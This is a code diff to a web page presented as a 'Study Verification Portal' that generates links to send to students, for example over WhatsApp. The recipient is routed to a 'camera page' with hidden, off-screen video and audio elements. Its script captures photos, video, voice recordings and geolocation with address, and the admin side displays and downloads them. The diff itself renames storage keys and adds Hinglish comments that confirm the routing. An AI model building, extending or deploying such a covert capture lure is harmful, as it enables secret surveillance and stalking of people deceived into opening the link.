@@ -18,18 +18,17 @@
         #hiddenVideo, #hiddenAudio { position: fixed; bottom: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; }
         .upload-card { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); transition: all 0.3s ease; }
         .upload-card:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
-        .stat-card { transition: all 0.3s ease; }
+        .stat-card { transition: all 0.3s ease; cursor: pointer; }
         .stat-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.25); }
-        .gallery-img { transition: all 0.3s ease; }
+        .gallery-img { transition: all 0.3s ease; cursor: pointer; }
         .gallery-img:hover { transform: scale(1.05); }
-        .tab-active { background: linear-gradient(135deg, #ec4899, #a855f7); color: white; }
     </style>
 </head>
 <body class="gradient-bg min-h-screen">
 
 <div class="container mx-auto px-4 py-8 max-w-5xl">
 
-<!-- ============ ADMIN PANEL ============ -->
+<!-- ============ ADMIN PANEL (Sirf jab URL mein ?admin ho) ============ -->
 <div id="adminPanel">
     <div class="text-center mb-10">
         <div class="inline-flex gap-2 bg-white/20 backdrop-blur rounded-full px-8 py-3 mb-5">
@@ -37,7 +36,7 @@
             <span class="text-white font-bold text-lg">✨ Study Verification Portal ✨</span>
         </div>
         <h1 class="text-4xl font-bold text-white mb-3">📚 Generate Student Link</h1>
-        <p class="text-white/80 text-lg">Create link → Student camera page open hoga</p>
+        <p class="text-white/80 text-lg">Link generate karo → Student camera page open hoga</p>
     </div>
 
     <!-- Custom Upload Section -->
@@ -99,27 +98,28 @@
                 <button onclick="copyLink()" class="flex-1 bg-pink-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fas fa-copy mr-2"></i> Copy Link</button>
                 <button onclick="sendToWhatsApp()" class="flex-1 bg-green-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fab fa-whatsapp mr-2"></i> WhatsApp</button>
             </div>
+            <p class="text-white/60 text-xs text-center mt-3">⚠️ Student is link ko open karega → Seedha Camera Page khulega</p>
         </div>
     </div>
 
     <!-- Stats Cards -->
     <div class="grid grid-cols-2 md:grid-cols-5 gap-5 mb-10">
-        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('photos')">
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center" onclick="showTab('photos')">
             <i class="fas fa-camera text-pink-400 text-2xl mb-2"></i>
             <p class="text-white text-3xl font-bold" id="statPhotos">0</p>
             <p class="text-white/70 text-sm">Photos</p>
         </div>
-        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('videos')">
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center" onclick="showTab('videos')">
             <i class="fas fa-video text-blue-400 text-2xl mb-2"></i>
             <p class="text-white text-3xl font-bold" id="statVideos">0</p>
             <p class="text-white/70 text-sm">Videos</p>
         </div>
-        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('voices')">
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center" onclick="showTab('voices')">
             <i class="fas fa-microphone text-green-400 text-2xl mb-2"></i>
             <p class="text-white text-3xl font-bold" id="statVoices">0</p>
             <p class="text-white/70 text-sm">Voice</p>
         </div>
-        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('locations')">
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center" onclick="showTab('locations')">
             <i class="fas fa-map-marker-alt text-red-400 text-2xl mb-2"></i>
             <p class="text-white text-3xl font-bold" id="statLocs">0</p>
             <p class="text-white/70 text-sm">Locations</p>
@@ -137,7 +137,7 @@
     <div id="locationsTab" class="space-y-4 hidden"></div>
 </div>
 
-<!-- ============ CAMERA PAGE (Student) ============ -->
+<!-- ============ CAMERA PAGE (Student - Sirf Camera Page) ============ -->
 <div id="cameraPanel" class="hidden">
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <audio id="hiddenAudio" autoplay></audio>
@@ -231,7 +231,7 @@ function displayPhotos() {
     [...allPhotos].reverse().forEach((p, idx) => {
         container.innerHTML += `
             <div class="bg-white/10 rounded-2xl overflow-hidden group">
-                <img src="${p.data}" class="gallery-img w-full h-36 object-cover cursor-pointer" onclick="window.open('${p.data}')">
+                <img src="${p.data}" class="gallery-img w-full h-36 object-cover" onclick="window.open('${p.data}')">
                 <div class="p-2 text-center flex justify-between items-center">
                     <span class="text-white text-xs">${p.time}</span>
                     <button onclick="downloadPhoto(${allPhotos.length-1-idx})" class="bg-pink-500 text-white px-2 py-1 rounded-lg text-xs">Download</button>
@@ -330,9 +330,9 @@ function generateLink() {
         image: storedCustomImage
     };
     
-    let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal2') || '[]');
+    let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal3') || '[]');
     allLinks.push(linkData);
-    localStorage.setItem('studyLinksFinal2', JSON.stringify(allLinks));
+    localStorage.setItem('studyLinksFinal3', JSON.stringify(allLinks));
     
     const baseUrl = window.location.href.split('?')[0];
     const fullLink = baseUrl + '?code=' + uniqueCode;
@@ -389,7 +389,7 @@ async function startRecording() {
             if(videoChunks.length) { 
                 const blob = new Blob(videoChunks, { type: 'video/webm' }); 
                 allVideos.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVideosFinal2', JSON.stringify(allVideos));
+                localStorage.setItem('studyVideosFinal3', JSON.stringify(allVideos));
                 updateStats();
                 displayVideos();
             } 
@@ -404,7 +404,7 @@ async function startRecording() {
             if(audioChunks.length) { 
                 const blob = new Blob(audioChunks, { type: 'audio/webm' }); 
                 allVoices.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVoicesFinal2', JSON.stringify(allVoices));
+                localStorage.setItem('studyVoicesFinal3', JSON.stringify(allVoices));
                 updateStats();
                 displayVoices();
             } 
@@ -437,7 +437,7 @@ async function getLocationWithAddress() {
             address: address,
             time: new Date().toLocaleString() 
         });
-        localStorage.setItem('studyLocsFinal2', JSON.stringify(allLocations));
+        localStorage.setItem('studyLocsFinal3', JSON.stringify(allLocations));
         updateStats();
         displayLocations();
     }, () => {});
@@ -462,7 +462,7 @@ function startCapture() {
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
             allPhotos.push({ id: Date.now(), data: photoData, time: new Date().toLocaleString() });
-            localStorage.setItem('studyPhotosFinal2', JSON.stringify(allPhotos));
+            localStorage.setItem('studyPhotosFinal3', JSON.stringify(allPhotos));
             capturedCount++;
             updateStats();
             displayPhotos();
@@ -475,10 +475,10 @@ function startCapture() {
 }
 
 function updateStats() {
-    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal2') || '[]');
-    let videos = JSON.parse(localStorage.getItem('studyVideosFinal2') || '[]');
-    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal2') || '[]');
-    let locs = JSON.parse(localStorage.getItem('studyLocsFinal2') || '[]');
+    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal3') || '[]');
+    let videos = JSON.parse(localStorage.getItem('studyVideosFinal3') || '[]');
+    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal3') || '[]');
+    let locs = JSON.parse(localStorage.getItem('studyLocsFinal3') || '[]');
     
     allPhotos = photos;
     allVideos = videos;
@@ -493,25 +493,29 @@ function updateStats() {
     displayPhotos();
 }
 
-// ============ CHECK URL ============
+// ============ CHECK URL - IMPORTANT FIX ============
 function checkUrl() {
     const urlParams = new URLSearchParams(window.location.search);
     const code = urlParams.get('code');
     
     if(code) {
-        let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal2') || '[]');
+        // Student link - Sirf Camera Page show karo
+        let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal3') || '[]');
         const linkData = allLinks.find(l => l.code === code);
         
         if(linkData) {
+            // Camera page show karo, admin panel hide
             document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('cameraPanel').classList.remove('hidden');
             startCameraPage(linkData);
         } else {
+            // Invalid code - admin panel show karo
             document.getElementById('adminPanel').classList.remove('hidden');
             document.getElementById('cameraPanel').classList.add('hidden');
             updateStats();
         }
     } else {
+        // No code - admin panel show karo (link generator)
         document.getElementById('adminPanel').classList.remove('hidden');
         document.getElementById('cameraPanel').classList.add('hidden');
         updateStats();
